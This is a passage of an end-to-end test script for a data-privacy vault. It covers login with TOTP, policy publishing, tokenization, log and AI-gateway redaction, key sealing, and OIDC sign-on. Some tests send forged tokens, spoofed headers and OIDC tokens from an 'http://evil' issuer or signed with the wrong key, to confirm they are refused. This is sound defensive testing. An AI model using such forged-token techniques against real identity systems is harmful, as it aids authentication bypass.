// End-to-end checks against a real Compose install. Every identifier is synthetic.
import { execSync, spawn } from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";

const BASE = "https://localhost:8443";
const DIR = process.env.RV_E2E_COMPOSE_DIR;
const { VaultClient } = await import(process.env.RV_E2E_SDK);
const COMPOSE = "docker compose -f docker-compose.yml -f docker-compose.e2e.yml --profile logs --profile ai --profile proxy --profile adapters --profile files";
const sh = (c) => execSync(c, { cwd: DIR, encoding: "utf8", maxBuffer: 1 << 28, stdio: ["ignore", "pipe", "pipe"] });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let passed = 0;
const failures = [];
function check(name, ok, detail = "") {
  if (ok) {
    passed++;
    console.log(`  ok    ${name}`);
  } else {
    failures.push(name);
    console.log(`  FAIL  ${name} ${detail}`);
  }
}
const section = (s) => console.log(`\n${s}`);
// Whether a proxy route has picked up an entity yet, from its shadow or enforcing counts.
const prxCallCounts = async (route, text) => {
  const r = await req(`/proxy/${route.json.id}/x/y`, { body: { note: text }, headers: { "x-rv-route-key": route.json.route_key } });
  return r.status === 200;
};

async function req(path, { method, body, token, headers } = {}) {
  const res = await fetch(BASE + path, {
    method: method ?? (body !== undefined ? "POST" : "GET"),
    headers: { ...(body !== undefined ? { "content-type": "application/json" } : {}), ...(token ? { authorization: `Bearer ${token}` } : {}), ...headers },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text, headers: res.headers };
}
const control = (p, o) => req(`/control${p}`, o);

function fromB32(s) {
  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = 0, val = 0; const out = [];
  for (const c of s) { val = (val << 5) | A.indexOf(c); bits += 5; if (bits >= 8) { out.push((val >>> (bits - 8)) & 255); bits -= 8; val &= (1 << bits) - 1; } }
  return Buffer.from(out);
}
function totp(secret, offset = 0) {
  const c = Buffer.alloc(8); c.writeBigUInt64BE(BigInt(Math.floor(Date.now() / 30000) + offset));
  const m = crypto.createHmac("sha1", fromB32(secret)).update(c).digest();
  return String((m.readUInt32BE(m[m.length - 1] & 15) & 0x7fffffff) % 1000000).padStart(6, "0");
}

async function login(email, password) {
  const first = await control("/v1/auth/login", { body: { email, password } });
  const secret = first.json.secret;
  // Codes are single-use per time step, so a second login in the same step waits.
  // An admin-issued password must be replaced as part of the first sign-in.
  const newPassword = `own-${crypto.randomBytes(9).toString("hex")}`;
  const done = await control("/v1/auth/login", { body: { email, password, totp: totp(secret), new_password: newPassword } });
  return { token: done.json.access_token, secret, first, done, newPassword };
}

// Synthetic identifiers. The database and log scans below search for exactly these.
const BVN = "22987650011", NIN = "37654320019", NUBAN = "0298765433", PHONE = "08039998877", NAME = "Chidinma Okonkwo", EMAIL = "e2e.secret.person@example.ng";

section("Bootstrap");
check("bootstrap is needed on a new install", (await control("/v1/bootstrap/status")).json.needed === true);
const boot = { organisation: "E2E Fintech", display_name: "Ada Admin", email: "ada@e2e.example.ng", password: "correct-horse-battery-1" };
check("a wrong bootstrap token is refused", (await control("/v1/bootstrap", { body: { ...boot, bootstrap_token: "wrong" } })).status === 401);
check("the right bootstrap token creates the admin", (await control("/v1/bootstrap", { body: { ...boot, bootstrap_token: process.env.RV_E2E_BOOTSTRAP } })).status === 200);
check("bootstrap cannot run twice", (await control("/v1/bootstrap", { body: { ...boot, bootstrap_token: process.env.RV_E2E_BOOTSTRAP } })).status === 409);

section("Login and MFA");
const pwOnly = await control("/v1/auth/login", { body: { email: boot.email, password: boot.password } });
check("a password alone yields no token", pwOnly.json.step === "enrol_totp" && !pwOnly.json.access_token);
check("a wrong password is refused", (await control("/v1/auth/login", { body: { email: boot.email, password: "not-the-password-99" } })).status === 401);
const adminSecret = pwOnly.json.secret;
const code = totp(adminSecret);
const adminLogin = await control("/v1/auth/login", { body: { email: boot.email, password: boot.password, totp: code } });
const ADMIN = adminLogin.json.access_token;
const me0 = (await control("/v1/me", { token: ADMIN })).json;
check("password plus code signs in", Boolean(ADMIN));
check("a TOTP code cannot be reused", (await control("/v1/auth/login", { body: { email: boot.email, password: boot.password, totp: code } })).status === 401);
check("endpoints need a token", (await control("/v1/vaults")).status === 401);

section("Vaults and two-person policy publishing");
const sandbox = await control("/v1/vaults", { token: ADMIN, body: { name: "Sandbox", environment: "sandbox", template: "wallet_psp", seed: true } });
check("a template creates a seeded sandbox vault", sandbox.json?.seeded === 25, sandbox.text);
const prod = await control("/v1/vaults", { token: ADMIN, body: { name: "Production", environment: "production", template: "wallet_psp" } });
const V = prod.json.id;
check("production vaults are named v_live", V.startsWith("v_live_"));
check("field preview is refused on production", (await control(`/v1/vaults/${V}/fields/preview`, { token: ADMIN, body: { data_type: "bvn", value: BVN } })).status === 400);
const pv = await control(`/v1/vaults/${sandbox.json.id}/fields/preview`, { token: ADMIN, body: { data_type: "bvn", value: "22123456789" } });
check("field preview shows token and mask on sandbox", pv.json.masked === "*******6789" && pv.json.token.startsWith("tok_bvn_"), pv.text);

const second = await control("/v1/principals", { token: ADMIN, body: { kind: "user", display_name: "Bola Second", email: "bola@e2e.example.ng", roles: ["admin"] } });
const bola = await login("bola@e2e.example.ng", second.json.temporary_password);
const BOLA = bola.token;
check("a second admin can sign in, replacing the temporary password", Boolean(BOLA));
check("the temporary password no longer works", (await control("/v1/auth/login", { body: { email: "bola@e2e.example.ng", password: second.json.temporary_password } })).status === 401);

const draft = await control("/v1/policies", { token: ADMIN, body: { name: "support-agents-nigeria", source: { limit_per_hour: 3, rules: [
  { id: "mask-ids", actions: ["detokenize"], who: { roles: ["support_agent"] }, what: { data_types: ["bvn", "nuban"] }, when: { purpose_required: true }, returns: "masked" },
  { id: "phone", actions: ["detokenize"], who: { roles: ["support_agent"] }, what: { data_types: ["phone_ng"] }, when: { purpose_required: true }, returns: "plaintext" },
] } } });
check("a draft saves", draft.status === 200, draft.text);
check("the author cannot publish their own draft", (await control(`/v1/policies/${draft.json.id}/publish`, { token: ADMIN, method: "POST" })).status === 403);
const pub = await control(`/v1/policies/${draft.json.id}/publish`, { token: BOLA, method: "POST" });
check("a second admin can publish it", pub.status === 200, pub.text);
const sim = await control("/v1/policies/preview", { token: ADMIN, body: { roles: ["support_agent"], field_name: "bvn", data_type: "bvn", purpose: "x", hour: 10 } });
check("the simulator explains the decision", sim.json.decision === "masked" && sim.json.trace.some((t) => t.won) && sim.json.trace.some((t) => t.failed_slot), sim.text);
await sleep(6000); // policies apply within the 5-second config cache

section("Service account and Node SDK");
const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
const seedB64 = privateKey.export({ format: "der", type: "pkcs8" }).subarray(-32).toString("base64");
const pubB64 = publicKey.export({ format: "der", type: "spki" }).subarray(-32).toString("base64");
const sa = await control("/v1/principals", { token: ADMIN, body: { kind: "service_account", display_name: "Payments backend", roles: ["backend_service"], public_key: pubB64 } });
check("a service account registers with only a public key", Boolean(sa.json?.key_id), JSON.stringify(sa.json));
const sdk = new VaultClient({ baseUrl: BASE, serviceAccountId: sa.json.id, keyId: sa.json.key_id, privateKey: seedB64 });
const toks = await sdk.tokenize(V, [
  { field: "bvn", value: BVN, subject_ref: "cust_e2e_1" }, { field: "nin", value: NIN, subject_ref: "cust_e2e_1" }, { field: "account_number", value: NUBAN, subject_ref: "cust_e2e_1" },
  { field: "phone", value: PHONE, subject_ref: "cust_e2e_1" }, { field: "full_name", value: NAME, subject_ref: "cust_e2e_1" }, { field: "email", value: EMAIL, subject_ref: "cust_e2e_1" },
]);
const T = Object.fromEntries(["bvn", "nin", "nuban", "phone", "name", "email"].map((k, i) => [k, toks[i].token]));
check("the SDK tokenizes a batch", toks.every((t) => t.token?.startsWith("tok_")), JSON.stringify(toks));
check("tokens carry at least 128 bits (22 base62 chars)", T.bvn.length === "tok_bvn_".length + 22);
check("the same value gets the same token", (await sdk.tokenize(V, [{ field: "bvn", value: BVN }]))[0].token === T.bvn);
check("lookup finds a token without revealing a value", (await sdk.lookup(V, "bvn", BVN)) === T.bvn);
let backendDenied = null;
try { await sdk.detokenize(V, [T.bvn], "backend read"); } catch (e) { backendDenied = e; }
check("a backend with write rights still cannot read: default deny", backendDenied?.code === "policy_denied", String(backendDenied));
const big = await sdk.tokenize(V, Array.from({ length: 1203 }, (_, i) => ({ field: "phone", value: `0805${String(1000000 + i)}` })));
check("the SDK splits 1,203 items across batches", big.length === 1203 && big[1202].index === 1202);

section("Reveal rules with real user tokens");
const reveal = (token, tokens, purpose = "Ticket 9") => req(`/v1/vaults/${V}/detokenize`, { token, body: { items: tokens.map((t) => ({ token: t })), purpose, continue_on_error: true } });
const r1 = await reveal(ADMIN, [T.bvn]);
check("the DPO role gets plaintext", r1.json.results[0].value === BVN && r1.json.results[0].decision === "plaintext", r1.text);
check("a reveal needs a purpose", (await req(`/v1/vaults/${V}/detokenize`, { token: ADMIN, body: { items: [{ token: T.bvn }] } })).status === 400);
const sup = await control("/v1/principals", { token: ADMIN, body: { kind: "user", display_name: "Sade Support", email: "sade@e2e.example.ng", roles: ["support_agent"] } });
const sade = await login("sade@e2e.example.ng", sup.json.temporary_password);
const r2 = await reveal(sade.token, [T.bvn, T.phone, T.email]);
const [rb, rp, re] = r2.json.results;
check("support gets BVN masked", rb.value === "*******0011" && rb.decision === "masked", r2.text);
check("support gets the phone in plaintext", rp.value === "+2348039998877", JSON.stringify(rp));
check("support gets email denied", re.decision === "denied" && !re.value, JSON.stringify(re));
const limited = await reveal(sade.token, [T.bvn, T.bvn, T.bvn, T.bvn]);
check("the policy's hourly reveal limit applies", limited.json.results.some((x) => x.error?.code === "rate_limited"), limited.text);

section("Edge");
for (const p of ["/internal/stats", "/control/internal/stats", "/logs/internal/stats"]) {
  check(`${p} is not reachable`, [404, 401].includes((await req(p, { method: "POST", body: {} })).status));
}
check("the edge blocks /internal outright", (await req("/internal/stats", { method: "POST", body: {} })).status === 404);
const spoof = await req(`/v1/vaults/${V}/detokenize`, { token: ADMIN, headers: { "x-forwarded-for": "1.2.3.4" }, body: { items: [{ token: T.bvn }], purpose: "spoof-check" } });
check("a detokenize with a spoofed client header still works", spoof.status === 200);

section("Log pipeline: shadow, enforcing, failure");
const received = [];
const upstream = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { received.push({ url: q.url, headers: q.headers, body: Buffer.concat(c).toString() }); s.writeHead(200, { "content-type": "application/json" }); s.end("{}"); }); });
await new Promise((r) => upstream.listen(18999, "0.0.0.0", r));
const pl = await control("/v1/log-pipelines", { token: ADMIN, body: { vault_id: V, name: "Datadog logs", source_type: "otlp", destination: "Datadog", upstream_url: "http://host.docker.internal:18999" } });
check("a pipeline starts in shadow mode, with a one-time key", pl.status === 200 && pl.json.ingest_key?.startsWith("rvk_"), pl.text);
const PID = pl.json.id, KEY = pl.json.ingest_key;
await sleep(6000);
const LINE = `transfer failed bvn=${BVN} account ${NUBAN} phone ${PHONE}`;
const otlp = { resourceLogs: [{ resource: { attributes: [{ key: "service.name", value: { stringValue: "payments" } }] }, scopeLogs: [{ logRecords: [{ body: { stringValue: LINE }, attributes: [{ key: "customer.bvn", value: { stringValue: BVN } }, { key: "ok", value: { stringValue: "fine" } }] }] }] }] };
const send = (body, key = KEY) => req(`/logs/otlp/${PID}/v1/logs`, { body, headers: { "x-rv-pipeline-key": key, "dd-api-key": "vendor-key-passthrough" } });
check("a wrong pipeline key is refused", (await send(otlp, "rvk_wrong")).status === 401);
const shadow = await send(otlp);
check("shadow mode forwards", shadow.status === 200, shadow.text);
check("shadow mode leaves logs unchanged", received.at(-1)?.body.includes(BVN));
check("the vendor API key passes through and the pipeline key does not", received.at(-1)?.headers["dd-api-key"] === "vendor-key-passthrough" && !received.at(-1)?.headers["x-rv-pipeline-key"]);

check("the before/after preview redacts", !(await control("/v1/log-pipelines/preview", { token: ADMIN, body: { sample: LINE } })).json.after.includes(BVN));
check("going live takes one PATCH", (await control(`/v1/log-pipelines/${PID}`, { token: ADMIN, method: "PATCH", body: { mode: "enforcing" } })).status === 200);
await sleep(6000);
received.length = 0;
const enf = await send(otlp);
const out = received.at(-1)?.body ?? "";
check("enforcing forwards", enf.status === 200, enf.text);
check("no BVN, account or phone reaches the destination", out !== "" && ![BVN, NUBAN, PHONE, "8039998877"].some((s) => out.includes(s)), out);
check("the destination gets the same deterministic token as the vault", out.includes(T.bvn), out);
check("non-sensitive content is kept", out.includes("transfer failed") && out.includes("fine"));

// OTLP over gRPC through the edge: a real HTTP/2 client and hand-encoded protobuf.
{
  const http2 = await import("node:http2");
  const pbLen = (n) => { const b = []; while (n > 127) { b.push((n & 127) | 128); n >>>= 7; } b.push(n); return Buffer.from(b); };
  const pbMsg = (field, inner) => Buffer.concat([Buffer.from([(field << 3) | 2]), pbLen(inner.length), inner]);
  // ExportLogsServiceRequest > ResourceLogs(1) > ScopeLogs(2) > LogRecord(2) > body(5) > string_value(1)
  const msg = pbMsg(1, pbMsg(2, pbMsg(2, pbMsg(5, pbMsg(1, Buffer.from(LINE))))));
  const frame = Buffer.concat([Buffer.from([0]), (() => { const b = Buffer.alloc(4); b.writeUInt32BE(msg.length); return b; })(), msg]);
  const grpcExport = (meta) => new Promise((resolve, reject) => {
    const c = http2.connect(BASE, { rejectUnauthorized: false });
    c.on("error", reject);
    const q = c.request({ ":method": "POST", ":path": "/opentelemetry.proto.collector.logs.v1.LogsService/Export", "content-type": "application/grpc", te: "trailers", ...meta });
    let code;
    q.on("response", (h) => { code = h["grpc-status"] ?? code; });
    q.on("trailers", (t) => { code = t["grpc-status"] ?? code; });
    q.on("data", () => {});
    q.on("end", () => { c.close(); resolve(code); });
    q.on("error", reject);
    q.end(frame);
  });
  received.length = 0;
  check("gRPC with no pipeline key is refused", (await grpcExport({ "x-rv-pipeline": PID })) === "16" && received.length === 0);
  check("gRPC with a wrong pipeline key is refused", (await grpcExport({ "x-rv-pipeline": PID, "x-rv-pipeline-key": "rvk_wrong" })) === "16" && received.length === 0);
  const grpcCode = await grpcExport({ "x-rv-pipeline": PID, "x-rv-pipeline-key": KEY, "dd-api-key": "vendor-key-passthrough" });
  const grpcOut = received.at(-1);
  check("gRPC with the right key succeeds and reaches the destination", grpcCode === "0" && grpcOut?.url === "/v1/logs", `status ${grpcCode}, ${grpcOut?.url}`);
  check("gRPC delivers no BVN, account or phone", Boolean(grpcOut) && ![BVN, NUBAN, PHONE, "8039998877"].some((v) => grpcOut.body.includes(v)), grpcOut?.body);
  check("gRPC delivers the vault's token and keeps other content", grpcOut?.body.includes(T.bvn) && grpcOut?.body.includes("transfer failed"), grpcOut?.body);
  check("gRPC passes the vendor key and withholds the pipeline key", grpcOut?.headers["dd-api-key"] === "vendor-key-passthrough" && !grpcOut?.headers["x-rv-pipeline-key"]);
}
received.length = 0;
const http1 = await req(`/logs/http/${PID}`, { body: [{ msg: `pay ${BVN}`, customer: { bvn: 22987650011 } }], headers: { "x-rv-pipeline-key": KEY } });
check("the Fluent Bit / Vector JSON front-end redacts too", http1.status === 200 && received.at(-1) && !received.at(-1).body.includes(BVN), received.at(-1)?.body);
await sleep(6000);
const ov = await control("/v1/overview", { token: ADMIN });
check("detections reach the overview", ov.json.caught.some((c) => c.entity_type === "bvn" && c.destination === "Datadog"), JSON.stringify(ov.json.caught));

// A value never seen before, so that the processor's token cache cannot serve it.
const FRESH = "22555544433";
sh(`${COMPOSE} stop vault-api`);
await sleep(1500);
received.length = 0;
const down = await req(`/logs/http/${PID}`, { body: [{ bvn: FRESH }], headers: { "x-rv-pipeline-key": KEY } });
check("with the vault down the processor tells the collector to retry (503)", down.status === 503, `${down.status} ${down.text}`);
check("with the vault down nothing is forwarded", received.length === 0, JSON.stringify(received));
sh(`${COMPOSE} start vault-api`);
for (let i = 0; i < 30; i++) { if ((await req("/healthz")).status === 200) break; await sleep(1000); }
await control(`/v1/log-pipelines/${PID}`, { token: ADMIN, method: "PATCH", body: { failure_mode: "drop" } });
await sleep(6000);
sh(`${COMPOSE} stop vault-api`);
await sleep(1500);
received.length = 0;
const dropped = await req(`/logs/http/${PID}`, { body: [{ bvn: "22555544434" }], headers: { "x-rv-pipeline-key": KEY } });
check("in drop mode logs are discarded and never forwarded raw", dropped.status === 202 && received.length === 0, `${dropped.status}`);
sh(`${COMPOSE} start vault-api`);
for (let i = 0; i < 30; i++) { if ((await req("/healthz")).status === 200) break; await sleep(1000); }
upstream.close();

section("Key service sealed");
sh(`${COMPOSE} restart keys vault-api`);
await sleep(4000);
const sealed = await req("/healthz");
check("health reports the key service down when sealed", sealed.status === 503 && sealed.json?.keys === "unavailable", sealed.text);
const whileSealed = await reveal(ADMIN, [T.bvn]);
check("nothing decrypts while sealed: 503 key_service_unavailable", whileSealed.status === 503 && whileSealed.json.error.code === "key_service_unavailable", whileSealed.text);
const shares = fs.readFileSync(`${DIR}/shares.e2e`, "utf8").trim().split("\n");
sh(`docker compose --profile tools run --rm tools keys unseal ${shares.slice(1, 4).join(" ")}`);
await sleep(1500);
check("any 3 of 5 shares unseal it", (await req("/healthz")).status === 200);
check("values decrypt again after unsealing", (await reveal(ADMIN, [T.bvn])).json.results[0].value === BVN);

section("Key rotation");
check("KEK rotation succeeds", (await control("/v1/keys/rotate", { token: ADMIN, body: { kind: "kek" } })).status === 200);
const rot = await control("/v1/keys/rotate", { token: ADMIN, body: { kind: "dek", vault_id: V, reencrypt: true } });
check("DEK rotation with re-encryption succeeds", rot.status === 200, rot.text);
sh(`${COMPOSE} restart vault-api`);
for (let i = 0; i < 30; i++) { if ((await req("/healthz")).status === 200) break; await sleep(1000); }
check("values still decrypt after both rotations and a restart", (await reveal(ADMIN, [T.bvn])).json.results[0].value === BVN);

section("Phase 3: resident checks");
const cmpPol = await control("/v1/policies", { token: ADMIN, body: { name: "resident-checks", source: { rules: [{ id: "c", actions: ["compare"], who: { roles: ["backend_service"] }, what: {}, when: {}, returns: "allow" }] } } });
await control(`/v1/policies/${cmpPol.json.id}/publish`, { token: BOLA, method: "POST" });
await sleep(6000);
const RES_TOK = (await sdk.tokenize(V, [{ field: "full_name", value: "Tunde Bakare" }]))[0].token;
const PHONE_TOK = (await sdk.tokenize(V, [{ field: "phone", value: "08035551212" }]))[0].token;
check("a name check says true, in either name order", (await sdk.residentCheck(V, RES_TOK, "name_match", "BAKARE Tunde", "KYC 1")) === true);
check("a name check says false for another name", (await sdk.residentCheck(V, RES_TOK, "name_match", "Ada Obi", "KYC 2")) === false);
check("an equals check normalises the supplied value", (await sdk.residentCheck(V, PHONE_TOK, "equals", "+234 803 555 1212", "KYC 3")) === true);
const rawCheck = await req(`/v1/vaults/${V}/resident/check`, { token: sade.token, body: { token: RES_TOK, check: "equals", arg: "x", purpose: "probe" } });
check("a person without the compare action is denied", rawCheck.status === 403, rawCheck.text);
check("checks are audited, and the audit event omits the answer", (await control("/v1/audit-events?action=compare&limit=5", { token: ADMIN })).json.events.every((e) => e.detail.includes("name_match") || e.detail.includes("equals")));

section("Phase 2: AI gateway");
const mock = { requests: [], reply: null };
const mockProvider = http.createServer((q, s) => {
  const c = [];
  q.on("data", (d) => c.push(d));
  q.on("end", () => {
    mock.requests.push({ url: q.url, headers: q.headers, body: Buffer.concat(c).toString() });
    if (mock.stream) {
      s.writeHead(200, { "content-type": "text/event-stream" });
      for (const piece of mock.stream) s.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: piece }, finish_reason: null }] })}\n\n`);
      s.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: {}, finish_reason: "stop" }] })}\n\ndata: [DONE]\n\n`);
      s.end();
      return;
    }
    s.writeHead(200, { "content-type": "application/json" });
    s.end(JSON.stringify({ echoed: q.headers["x-rv-route-key"] ?? null, choices: [{ message: { role: "assistant", content: mock.reply } }] }));
  });
});
await new Promise((r) => mockProvider.listen(18998, "0.0.0.0", r));
const air = await control("/v1/ai-routes", { token: ADMIN, body: { vault_id: V, name: "Chatbot", provider: "mock", upstream_base_url: "http://host.docker.internal:18998/v1", allowed_models: ["gpt-test"], restore_in_response: true } });
check("an AI route starts in shadow mode with a one-time key", air.status === 200 && air.json.route_key?.startsWith("rvr_"), air.text);
await sleep(6000);
const aiCall = (body, headers = {}) => req(`/ai/${air.json.id}/v1/chat/completions`, { body, headers: { "x-rv-route-key": air.json.route_key, authorization: "Bearer provider-secret", ...headers } });
const prompt = { model: "gpt-test", messages: [{ role: "user", content: `Customer BVN ${BVN} and account ${NUBAN}. Draft a reply.` }] };
check("a wrong route key is refused", (await req(`/ai/${air.json.id}/v1/chat/completions`, { body: prompt, headers: { "x-rv-route-key": "rvr_bad" } })).status === 401);
mock.reply = "shadow reply";
await aiCall(prompt);
check("shadow mode forwards the prompt unchanged", mock.requests.at(-1).body.includes(BVN));
check("a disallowed model is refused", (await aiCall({ ...prompt, model: "other" })).status === 403);
await control(`/v1/ai-routes/${air.json.id}`, { token: ADMIN, method: "PATCH", body: { mode: "enforcing" } });
await sleep(6000);
mock.reply = "Your BVN [BVN_1] and account [ACCOUNT_1] are noted.";
const masked = await aiCall(prompt);
const sent = mock.requests.at(-1);
check("the provider never sees the identifiers", !sent.body.includes(BVN) && !sent.body.includes(NUBAN) && sent.body.includes("[BVN_1]"), sent.body);
check("the provider key passes through, and the route key does not", sent.headers.authorization === "Bearer provider-secret" && !sent.headers["x-rv-route-key"]);
check("with no caller token the reply comes back masked", masked.text.includes("*******0011") && !masked.text.includes(BVN), masked.text);
const plain = await aiCall(prompt, { "x-rv-caller-token": ADMIN });
check("a DPO caller gets real values back", plain.text.includes(BVN) && plain.text.includes(NUBAN), plain.text);
const sup2 = await aiCall(prompt, { "x-rv-caller-token": sade.token });
check("a support caller still gets masked values", !sup2.text.includes(BVN), sup2.text);
check("a forged caller token is refused", (await aiCall(prompt, { "x-rv-caller-token": "not.a.token" })).status === 401);
check("images are refused while enforcing", (await aiCall({ model: "gpt-test", messages: [{ role: "user", content: [{ type: "image_url", image_url: { url: "data:image/png;base64,AAAA" } }] }] })).status === 422);
mock.stream = ["Your BVN is [", "BVN", "_1", "] today"];
const streamed = await aiCall({ ...prompt, stream: true });
mock.stream = null;
const deltas = streamed.text.split("\n").filter((l) => l.startsWith("data: {")).map((l) => JSON.parse(l.slice(6)).choices[0].delta.content ?? "").join("");
check("streaming restores a placeholder split across chunks", deltas === "Your BVN is *******0011 today", deltas);
const aiAudit = await control("/v1/audit-events?module=ai&limit=20", { token: ADMIN });
check("restoring in a reply is audited as a reveal", aiAudit.json.events.some((e) => e.decision === "plaintext" && e.principal_id === me0.id), aiAudit.text.slice(0, 200));
const play = await control("/v1/ai-routes/preview", { token: ADMIN, body: { prompt: "BVN 22123456789" } });
check("the playground shows both sides", play.json.provider_receives === "BVN [BVN_1]" && play.json.user_sees === "BVN *******6789", play.text);

section("Phase 2: HTTP proxy");
const prx = await control("/v1/proxy-routes", { token: ADMIN, body: { vault_id: V, name: "CRM", method: "POST", path_pattern: "/crm/**", upstream_url: "http://host.docker.internal:18998", redact_paths: [{ path: "$.customer.bvn", field: "bvn" }, { path: "$.items[*].account", field: "account_number" }], response_unredact_paths: [{ path: "$.customer.bvn" }], redact_query: [{ param: "phone", field: "phone" }] } });
check("a proxy route creates with a one-time key", prx.status === 200 && Boolean(prx.json.route_key), prx.text);
await sleep(6000);
const prxCall = (p, body, headers = {}) => req(`/proxy/${prx.json.id}${p}`, { body, headers: { "x-rv-route-key": prx.json.route_key, ...headers } });
mock.requests.length = 0;
mock.reply = "x";
const crm = await prxCall("/crm/customers?phone=08034445555&page=2", { customer: { bvn: "22456789012", tier: "gold" }, items: [{ account: "0456789013" }], note: "also call 08036667777" });
const crmSent = mock.requests.at(-1);
check("the proxy tokenizes named paths", crm.status === 200 && crmSent && !crmSent.body.includes("22456789012") && !crmSent.body.includes("0456789013") && crmSent.body.includes("tok_bvn_"), crmSent?.body);
check("the proxy keeps other fields", crmSent.body.includes("gold"));
check("the proxy tokenizes named query parameters", !crmSent.url.includes("08034445555") && crmSent.url.includes("page=2"), crmSent.url);
check("detection catches an identifier no rule named", !crmSent.body.includes("08036667777"), crmSent.body);
check("the route key is not forwarded", !crmSent.headers["x-rv-route-key"]);
check("another path is not routed", (await prxCall("/elsewhere", { a: 1 })).status === 405);
check("a non-JSON body cannot pass a route with field rules", (await req(`/proxy/${prx.json.id}/crm/x`, { method: "POST", headers: { "x-rv-route-key": prx.json.route_key, "content-type": "text/plain" }, body: undefined }).then(() => fetch(`${BASE}/proxy/${prx.json.id}/crm/x`, { method: "POST", headers: { "x-rv-route-key": prx.json.route_key, "content-type": "text/plain" }, body: "bvn=22456789012" }))).status === 415);
const prev = await control("/v1/proxy-routes/preview", { token: ADMIN, body: { route: { redact_paths: [{ path: "$.a" }], dlp: false, name: "p", method: "POST", path_pattern: "/", upstream_url: "" }, request: '{"a":"secret","b":"keep"}', response: "{}" } });
check("the route builder previews a transformed payload", !prev.json.request?.includes("secret") && prev.json.request?.includes("keep"), prev.text);
sh(`${COMPOSE} stop vault-api`);
await sleep(1500);
mock.requests.length = 0;
const prxDown = await prxCall("/crm/x", { customer: { bvn: "22456789099" } });
check("with the vault down the proxy forwards nothing", prxDown.status === 503 && mock.requests.length === 0, `${prxDown.status}`);
const aiDown = await aiCall({ model: "gpt-test", messages: [{ role: "user", content: "BVN 22456789098" }] }, { "x-rv-caller-token": ADMIN });
check("with the vault down a reply cannot be restored in full", aiDown.status === 503 || !aiDown.text.includes("22456789098"), aiDown.text.slice(0, 120));
sh(`${COMPOSE} start vault-api`);
for (let i = 0; i < 30; i++) { if ((await req("/healthz")).status === 200) break; await sleep(1000); }
mockProvider.close();

section("Single sign-on: OIDC");
{
  const { createRequire } = await import("node:module");
  const { publicKey: idpPub, privateKey: idpPriv } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
  const jwk = { ...idpPub.export({ format: "jwk" }), kid: "k1", use: "sig", alg: "RS256" };
  const idp = { email: "ssouser@e2e.example.ng", nonce: null, aud: "rv-client", emailVerified: true, issuer: "http://host.docker.internal:18997", key: idpPriv };
  const signJwt = (claims, key) => { const h = Buffer.from(JSON.stringify({ alg: "RS256", kid: "k1", typ: "JWT" })).toString("base64url"); const b = Buffer.from(JSON.stringify(claims)).toString("base64url"); return `${h}.${b}.${crypto.sign("RSA-SHA256", Buffer.from(`${h}.${b}`), key).toString("base64url")}`; };
  const idpSrv = http.createServer((q, s) => {
    const c = [];
    q.on("data", (d) => c.push(d));
    q.on("end", () => {
      const send = (o) => { s.writeHead(200, { "content-type": "application/json" }); s.end(JSON.stringify(o)); };
      if (q.url.startsWith("/.well-known")) return send({ issuer: "http://host.docker.internal:18997", authorization_endpoint: "http://host.docker.internal:18997/authorize", token_endpoint: "http://host.docker.internal:18997/token", jwks_uri: "http://host.docker.internal:18997/jwks" });
      if (q.url === "/jwks") return send({ keys: [jwk] });
      if (q.url === "/token") { const now = Math.floor(Date.now() / 1000); return send({ id_token: signJwt({ iss: idp.issuer, aud: idp.aud, sub: "u1", email: idp.email, email_verified: idp.emailVerified, nonce: idp.nonce, iat: now, exp: now + 300 }, idp.key) }); }
      s.writeHead(404); s.end();
    });
  });
  await new Promise((r) => idpSrv.listen(18997, "0.0.0.0", r));
  const su = await control("/v1/principals", { token: ADMIN, body: { kind: "user", display_name: "SSO User", email: "ssouser@e2e.example.ng", roles: ["engineer"] } });
  check("OIDC needs an IdP that enforces MFA", (await control("/v1/settings/sso", { method: "PUT", token: ADMIN, body: { kind: "oidc", email_domains: ["e2e.example.ng"], issuer: idp.issuer, client_id: "rv-client", client_secret: "s", idp_enforces_mfa: false } })).status === 400);
  const put = await control("/v1/settings/sso", { method: "PUT", token: ADMIN, body: { kind: "oidc", email_domains: ["e2e.example.ng"], issuer: idp.issuer, client_id: "rv-client", client_secret: "s", idp_enforces_mfa: true } });
  check("OIDC configures", put.status === 200, put.text);
  const start = async (email = "ssouser@e2e.example.ng") => { const r = await control("/v1/auth/sso/start", { body: { email } }); const u = new URL(r.json.redirect); idp.nonce = u.searchParams.get("nonce"); return u.searchParams.get("state"); };
  check("an unknown domain gets no SSO", (await control("/v1/auth/sso/start", { body: { email: "x@other.example.ng" } })).json.sso === false);
  const state = await start();
  const ok = await control("/v1/auth/sso/oidc", { body: { state, code: "c" } });
  check("a valid OIDC login signs in", Boolean(ok.json?.access_token), ok.text);
  check("an OIDC session works on the control plane", (await control("/v1/me", { token: ok.json?.access_token })).status === 200);
  check("a state cannot be reused", (await control("/v1/auth/sso/oidc", { body: { state, code: "c" } })).status === 401);
  check("a made-up state is refused", (await control("/v1/auth/sso/oidc", { body: { state: "nope", code: "c" } })).status === 401);
  const bad = async (name, mutate) => { const st = await start(); const undo = mutate(); const r = await control("/v1/auth/sso/oidc", { body: { state: st, code: "c" } }); undo(); check(`OIDC refuses ${name}`, r.status === 401 && !r.json?.access_token, r.text); };
  await bad("a token for another audience", () => { idp.aud = "other"; return () => { idp.aud = "rv-client"; }; });
  await bad("a token from another issuer", () => { idp.issuer = "http://evil"; return () => { idp.issuer = "http://host.docker.internal:18997"; }; });
  await bad("a wrong nonce", () => { const n = idp.nonce; idp.nonce = "wrong"; return () => { idp.nonce = n; }; });
  await bad("an unverified email", () => { idp.emailVerified = false; return () => { idp.emailVerified = true; }; });
  await bad("a token signed by another key", () => { idp.key = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 }).privateKey; return () => { idp.key = idpPriv; }; });
  await bad("someone not added here", () => { idp.email = "stranger@e2e.example.ng"; return () => { idp.email = "ssouser@e2e.example.ng"; }; });
  await bad("an email outside the configured domains", () => { idp.email = "ada@evil.example.ng"; return () => { idp.email = "ssouser@e2e.example.ng"; }; });
